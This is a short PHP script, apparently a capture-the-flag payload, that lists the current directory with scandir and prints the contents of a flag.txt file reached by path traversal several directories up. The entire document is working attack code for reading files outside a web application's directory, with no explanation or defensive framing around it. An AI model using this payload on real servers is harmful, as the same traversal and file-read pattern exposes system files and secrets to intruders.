<?php
$scan = scandir('./');
echo 'scan: ';
print_r($scan);

echo file_get_contents('../../../../../flag.txt');
